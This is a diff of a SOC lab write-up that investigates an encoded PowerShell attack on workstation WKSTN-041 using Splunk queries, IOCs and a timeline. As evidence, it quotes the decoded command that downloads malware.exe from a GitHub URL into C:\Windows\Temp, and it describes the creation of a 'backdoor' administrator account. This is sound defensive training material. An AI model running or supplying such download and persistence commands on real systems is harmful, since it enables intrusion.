@@ -1,8 +1,8 @@
 ## Summary
-An attacker used PowerShell to compromise workstation DESKTOP-8TU4818 at SecureCode infotec. Attackers used powershell encoding to avoid detection, downloaded malware from an external server, created a secret administrator account to maintain persistence, and then started mapping out the internal network. This was a structured and deliberate attack that went undetected because there was no PowerShell monitoring in place.   
+An attacker used PowerShell to compromise workstation WKSTN-041 at SecureCode infotec. Attackers used powershell encoding to avoid detection, downloaded malware from an external server, created a secret administrator account to maintain persistence, and then started mapping out the internal network. This was a structured and deliberate attack that went undetected because there was no PowerShell monitoring in place.   
 
 ## Scenario
-It is Saturday Evening at SecureCode infotec. The SIEM fires an alert about suspicious PowerShell activity on workstation DESKTOP-8TU4818. The alert shows PowerShell was launched with unusual parameters from a process. As the analyst on duty the task is to investigate whether this is a legitimate administrator or an attacker using PowerShell to compromise the machine.
+It is Saturday Evening at SecureCode infotec. The SIEM fires an alert about suspicious PowerShell activity on workstation WKSTN-041. The alert shows PowerShell was launched with unusual parameters from a process. As the analyst on duty the task is to investigate whether this is a legitimate administrator or an attacker using PowerShell to compromise the machine.
 
 ## Objective
 Use Splunk to investigate suspicious PowerShell execution, identify all malicious commands and techniques used, understand the full scope of the attack, and produce a clear professional report of the findings.
@@ -17,11 +17,11 @@ PowerShell is built into every Windows machine and is trusted by the operating s
 ## Investigation Steps
 ## Alert
 **Name:** Suspecious PowerShell execution.   
-**Description** Encoded command execution detected.  
-**Username** Administrator   
-**Workstation** WKSTN-041   
-**Time** 09/06/2026 12:39:43.372 PM   
-**Process ID** 0x5dc  
+**Description:** Encoded command execution detected.  
+**Username:** Administrator   
+**Workstation:** WKSTN-041   
+**Time:** 09/06/2026 12:39:43.372 PM   
+**Process ID:** 0x5dc  
 
 ## Alert Investigation
 As usual, I’ll start the investigation with the information provided by the alert: the username, timestamp, workstation name, and the fact that a PowerShell execution was detected.  
@@ -32,12 +32,12 @@ We can use the username, workstation, and timestamp from the alert to narrow dow
 
 **SPL query: ** `index=Winserver host="WKSTN-041" EventCode=4688 New_Process_ID=0x5dc Account_Name="Administrator" earliest="09/06/2026:12:39:00" latest="09/06/2026:12:40:30" | table _time host Account_Name New_Process_ID New_Process_Name Creator_Process_ID Creator_Process_Name Process_Command_Line`  
 
-!(img)[]  
+![img](https://github.com/s-anjeev/soc-projects/blob/main/05-Splunk-SIEM-Lab/case-03-Powershell-Process-Execution/images/1st.png)  
 
 The Splunk query identified a PowerShell process executed by the `Administrator` account on workstation `WKSTN-041`. The process ID `0x5dc` corresponds to the process referenced in the alert. The process command line contains an encoded PowerShell command (`-EncodedCommand`)`, indicating an attempt to obfuscate the command being executed.    
 
 **Key Findings**   
-| IOC / Observable | Value | Description |
+| Observable | Value | Description |
 |---|---|---|
 | **Timestamp** | 2026-09-06 12:39:43.372 | Time of suspicious process execution |
 | **Host** | WKSTN-041 | Affected workstation |
@@ -53,11 +53,11 @@ The Splunk query identified a PowerShell process executed by the `Administrator`
 **Lets Decode Executed Command Using cyberchef.io**    
 The decoded PowerShell command revealed an attempt to download `malware.exe` from a GitHub repository and save it to `C:\Windows\Temp\malware.exe`. The use of `-EncodedCommand`provided an additional layer of obfuscation.   
 
-!(img)[]  
+![img](https://github.com/s-anjeev/soc-projects/blob/main/05-Splunk-SIEM-Lab/case-03-Powershell-Process-Execution/images/2st.png)   
 
 Actual Command executed was `Invoke-WebRequest -Uri "https://github.com/s-anjeev/soc-projects/blob/main/03-Malware-Analysis/case-01-powershell-dropper/sample/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"` this is confirmand by Event Code `4104` and `cyberchef`.
 
-!(img)[]  
+![img](https://github.com/s-anjeev/soc-projects/blob/main/05-Splunk-SIEM-Lab/case-03-Powershell-Process-Execution/images/3st.png)   
 
 **Key Findings**  
 - **PowerShell Web Request:** The command uses `Invoke-WebRequest` to retrieve a file from a remote GitHub repository.
@@ -98,7 +98,7 @@ The following PowerShell commands were observed through Windows PowerShell Scrip
 | `2026-09-06 12:41:14.059` | `Get-LocalGroupMember -Group "Administrators"` | Checks the members of the Administrators group, potentially verifying the newly created account. |
 
 
-## indicators of compromised  
+## Indicators of compromise  
 The following indicators were identified during the investigation:  
 
 | IOC Type | Indicator | Description |
@@ -112,7 +112,7 @@ The following indicators were identified during the investigation:
 | **Account Group** | `Administrators` | The `backdoor` account was added to the local Administrators group. |
 | **Process** | `powershell.exe` | PowerShell was used to execute the encoded command and subsequent reconnaissance commands. |  
 
-## Attack Timeline
+# Attack Timeline
 | Time | What happened |
 |---|---|
 | `2026-09-06 12:39:24.721` | `explorer.exe` launched `WindowsTerminal.exe` (PID `0xba0`). |
@@ -128,7 +128,7 @@ The following indicators were identified during the investigation:
 | `2026-09-06 12:41:02.175` | A local account named `backdoor` was created and added to the `Administrators` group. |
 | `2026-09-06 12:41:14.059` | `Get-LocalGroupMember -Group "Administrators"` was executed to verify administrator group membership. |
 
-## Summery  
+# Summery  
 The investigation identified a suspicious PowerShell execution on WKSTN-041 under the Administrator account. Process-tree analysis showed the execution chain from explorer.exe to WindowsTerminal.exe, followed by two PowerShell processes. The alert-triggering process (0x5dc) executed a Base64-encoded PowerShell command.   
 
 After decoding the command and reviewing PowerShell Event ID 4104, it was confirmed that Invoke-WebRequest was used to download malware.exe and save it to C:\Windows\Temp\malware.exe. Further 4104 analysis revealed system and account discovery activity, followed by the creation of a backdoor local account and its addition to the Administrators group.   
